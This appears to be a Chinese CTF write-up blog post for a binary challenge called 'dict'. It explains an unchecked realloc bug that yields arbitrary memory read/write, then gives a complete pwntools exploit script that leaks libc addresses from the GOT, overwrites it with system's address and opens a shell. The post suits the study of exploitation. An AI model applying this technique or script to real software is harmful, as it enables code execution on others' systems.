---
layout: post
title: "dict"
date: 2015-10-25 20:09:29 +0800
comments: true
categories: 
---
###0x00 漏洞

	 *(&ptr + 2 * index) = realloc(*(&ptr + 2 * index), 32 * (old_count + count));
	    i = 0;
	    while ( i < count )
	    {
	      printf("Input new word %d: ", i);
	      v1 = (int)((char *)*(&ptr + 2 * index) + 0x20 * (old_count + i));

realloc后没判断，可以构造count为一个地址造成任意地址读写  

###0x01 how
创造一个dict0，使num恰好可以任意地址写  
地址选择dict1  
dict之后写入got.plt的地址，就可以泄漏地址
之后的dict数量改为指向got.plt的地址就可以改写got.plt

示意如下

	num0
	ptr0
	num1    ----------  2
	ptr1    ------------    gotplt
	num2    ----------  2
	ptr     --------------  gotplt
	num3--------------   可以更改got.plt的num

###0x02 gdb

b *0x8048990  
b *0x8048940  
add大小 252710928

pwn send字节太大会送不过去


###0x03 exp

	from pwn import *

	p = process('./dict')
	#p = remote('192.168.56.103', 6666)


	dict2 = 0x804A0CC
	def create(num):
	#    print p.recvuntil("$")
		p.sendline("1")
	#	print p.recvuntil(":")
		p.sendline(str(num))
		for i in range(128):
			print 'loop%d'%i
			p.send('1\n'*(num/128))
			p.recvuntil('%d:'%(num/128*(i+1)))
		p.send('1\n'*(num % 128))
		print 'done'


	def screate(num, cont):
		#print p.recvuntil("$")
		p.sendline("1")
		#print p.recvuntil(":")
		p.sendline(str(num))
		#print p.recvuntil(":")
		p.sendline(cont)
		p.sendline('\n')

	def add(index, num, cont):
		#print p.recvuntil("$")
		p.sendline("2")
		#print p.recvuntil(":")
		p.sendline(str(index))
		#print p.recvuntil("?")
		p.sendline(str(num))
		#print p.recvuntil(":")
		p.sendline(payload)

	#
	create(4203782)
	screate(2, '/bin/sh')
	screate(2, '/bin/sh')
	screate(2, '/bin/sh')
	screate(2, '/bin/sh')
	screate(2, '/bin/sh')
	p.sendline('')
	got = 0x0804A00C
	payload  = ''
	payload += p32(4203782)		#0
	payload += p32(0)
	payload += p32(2)		#1
	payload += p32(got+0x14)
	payload += p32(2)		#2
	payload += p32(got+0x24)
	payload += p32((got+0x30)/32)[:3] 	#3	#hack got realloc
	add(0, 0x0f101010, payload)

	#leak
	p.sendline('\n')
	p.sendline('3')
	p.sendline('1')
	data = p.recvuntil('Dict 1:')
	data = p.recvuntil('1: ')
	data = p.recvuntil('2: ')
	puts_r = u32(data[0:4])
	gmon_r = u32(data[4:8])
	exit_r = u32(data[8:12])
	libc_r = u32(data[12:16])
	log.info('puts_r: '+hex(puts_r))
	log.info('gmon_r: '+hex(gmon_r))
	log.info('exit_r: '+hex(exit_r))
	log.info('libc_r: '+hex(libc_r))

	#leak
	p.sendline('\n')
	p.sendline('3')
	p.sendline('2')
	data = p.recvuntil('Dict 2:')
	data = p.recvuntil('1: ')
	data = p.recvuntil('2: ')
	setvbuf_r = u32(data[0:4])
	memset_r = u32(data[4:8])
	log.info('setvbuf_r: '+hex(setvbuf_r))
	log.info('memset_r : '+hex(memset_r ))


	#hack got 
	libc = ELF('/usr/lib/libc.so.6')
	system_l = libc.symbols['system']
	puts_l = libc.symbols['puts']
	system_r = system_l - puts_l + puts_r
	log.info('system: '+hex(system_r))

	payload  = ''
	payload += p32(puts_r)
	payload += p32(gmon_r)
	payload += p32(exit_r)
	payload += p32(libc_r)
	payload += p32(setvbuf_r)
	payload += p32(memset_r)
	payload += p32(system_r)
	print p.recvuntil("$")
	p.sendline("2")
	print p.recvuntil(":")
	p.sendline('3')
	print p.recvuntil("?")
	p.sendline(str(0x0f101010))
	print p.recvuntil(":")
	p.sendline(payload)


	p.interactive()
